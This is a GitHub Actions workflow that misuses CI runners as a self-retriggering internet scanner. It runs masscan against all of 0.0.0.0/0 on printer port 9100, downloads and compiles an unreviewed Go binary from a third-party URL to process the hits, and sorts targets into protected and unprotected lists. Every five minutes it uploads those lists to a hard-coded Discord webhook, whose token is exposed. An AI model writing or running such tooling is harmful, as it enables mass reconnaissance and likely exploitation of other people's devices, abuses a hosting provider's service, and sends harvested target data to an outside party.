name: Create VPS

on:
  workflow_dispatch:
  repository_dispatch:
    types: [create-vps]

jobs:
  start-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: ⬇️ Checkout
        uses: actions/checkout@v3

      - name: 📂 Create dirs
        run: mkdir -p links .backup

      - name: 📦 Restore backup
        run: |
          name="${{ github.event.client_payload.vps_name }}"
          if [ "${{ github.event.client_payload.backup }}" == "true" ]; then
            echo "🔄 Restoring backup..."
            unzip ".backup/$name.zip" -d . || echo "⚠️ No backup to restore."
          fi

      - name: 🔌 Install deps
        run: |
          sudo apt update -qq
          sudo apt install -y -qq masscan golang-go

      - name: ⬇️ Fetch and compile d.go
        run: |
          echo "🔄 Fetching d.go..."
          curl -sL -o d.go "https://raw.githubusercontent.com/Nightmary9992/ashu/main/d.go"
          
          echo "🔄 Compiling d.go..."
          go mod init d
          go mod tidy
          CGO_ENABLED=0 go build -o d d.go
          
          echo "✅ d binary ready"

      - name: 🚀 Start masscan scanner in background
        run: |
          echo "🚀 Starting masscan → d pipeline..."
          
          sudo pkill -f masscan || true
          sudo pkill -f './d' || true
          sleep 2
          
          nohup bash -c 'sudo masscan -p 9100 --rate 100000 --exclude 255.255.255.255 0.0.0.0/0 | grep --line-buffered -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | ./d' > scanner.log 2>&1 &
          echo $! > scanner.pid
          echo "✅ Scanner started (PID: $(cat scanner.pid))"
          sleep 5
          echo "--- Initial Scanner Log ---"
          head -n 20 scanner.log
          echo "---------------------------"

      - name: ⏳ Live Logs & Run for 5h55m
        run: |
          # set +e prevents curl/DNS errors from killing the whole 6h scanner
          set +e
          
          echo "⏳ Running for 5 hours 55 minutes..."
          END_TIME=$((SECONDS + 21300))
          WEBHOOK="https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
          LAST_FILE_PING=0
          
          while [ $SECONDS -lt $END_TIME ]; do
            if ! sudo kill -0 $(cat scanner.pid) 2>/dev/null; then
              echo "⚠️ Scanner died at $(date). Restarting..."
              cat scanner.log
              
              sudo pkill -f masscan || true
              sudo pkill -f './d' || true
              sleep 2
              
              > scanner.log
              nohup bash -c 'sudo masscan -p 9100 --rate 100000 --exclude 255.255.255.255 0.0.0.0/0 | grep --line-buffered -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | ./d' > scanner.log 2>&1 &
              echo $! > scanner.pid
            fi
            
            tail -n 1 scanner.log 2>/dev/null
            UPTIME_MIN=$((SECONDS / 60))
            
            NOW=$SECONDS
            if [ $((NOW - LAST_FILE_PING)) -ge 300 ]; then
              LAST_FILE_PING=$NOW
              echo "📤 Sending 5-minute file update to Discord..."
              
              BIG=$(wc -l < big.txt 2>/dev/null || echo 0)
              PROT=$(wc -l < protected.txt 2>/dev/null || echo 0)
              UNPROT=$(wc -l < unprotected.txt 2>/dev/null || echo 0)
              
              tar -czf update.tar.gz big.txt protected.txt unprotected.txt 2>/dev/null || true
              
              curl -s -F "file1=@update.tar.gz" \
                   -F "payload_json={\"content\":\"📊 **5-Min Update [${UPTIME_MIN}m]**\n> big.txt: $BIG lines\n> protected.txt: $PROT lines\n> unprotected.txt: $UNPROT lines\"}" \
                   "$WEBHOOK" || echo "⚠️ Discord upload failed, continuing..."
              rm -f update.tar.gz
            fi
            
            sleep 2
          done
          
          echo "⏰ Time's up — sending final results to Discord..."

      - name: 📤 Send final results to Discord
        run: |
          set +e
          WEBHOOK="https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
          
          tar -czf final_results.tar.gz big.txt protected.txt unprotected.txt 2>/dev/null || true
          
          if [ -f "final_results.tar.gz" ] && [ -s "final_results.tar.gz" ]; then
            echo "📤 Sending final_results.tar.gz..."
            curl -s -F "file1=@final_results.tar.gz" -F "payload_json={\"content\":\"📦 **FINAL results archive:**\"}" "$WEBHOOK"
          else
            curl -H "Content-Type: application/json" \
                 -X POST \
                 -d "{\"content\":\"⚠️ No final results generated\"}" \
                 "$WEBHOOK"
          fi

      - name: 🛑 Kill scanner
        run: |
          sudo pkill -f masscan || true
          sudo pkill -f './d' || true
          echo "✅ Scanner stopped"

      - name: 💾 Save backup (git)
        run: |
          name="${{ github.event.client_payload.vps_name }}"
          zip -r ".backup/$name.zip" big.txt protected.txt unprotected.txt d.go d scanner.log 2>/dev/null || true

      - name: ⬆️ Push backup to git
        uses: stefanzweifel/git-auto-commit-action@v5
        with:
          commit_message: "🔄 Results + backup for ${{ github.event.client_payload.vps_name }}"
          file_pattern: 'links/*.txt .backup/*.zip'

      - name: 🔁 Trigger next cycle
        run: |
          echo "🔁 Triggering next VPS cycle..."
          curl -X POST https://api.github.com/repos/${{ github.repository }}/dispatches \
          -H "Accept: application/vnd.github.v3+json" \
          -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
          -d '{ "event_type": "create-vps", "client_payload": { "vps_name": "autovps", "backup": true }}'
